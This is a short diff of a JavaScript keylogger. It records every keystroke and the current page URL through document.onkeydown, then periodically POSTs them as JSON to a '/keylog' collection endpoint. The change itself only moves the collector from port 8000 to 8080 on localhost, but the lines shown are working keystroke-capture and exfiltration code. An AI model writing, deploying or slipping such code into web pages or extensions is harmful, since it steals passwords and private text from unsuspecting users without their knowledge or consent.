@@ -2,7 +2,7 @@ var keys = '';
 var current = document.URL;
 
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "http://127.0.0.1:8000/keylog", true);
+xhr.open("POST", "http://127.0.0.1:8080/keylog", true);
 xhr.setRequestHeader('Content-Type', 'application/json');
 const json = {
     "logged": current,
@@ -19,7 +19,7 @@ document.onkeydown = function (e) {
 window.setInterval(function () {
     if (keys != "") {
         var xhr_key = new XMLHttpRequest();
-        xhr_key.open("POST", "http://127.0.0.1:8000/keylog", true);
+        xhr_key.open("POST", "http://127.0.0.1:8080/keylog", true);
         xhr_key.setRequestHeader('Content-Type', 'application/json');
         const json_key = {
             "logged": keys,
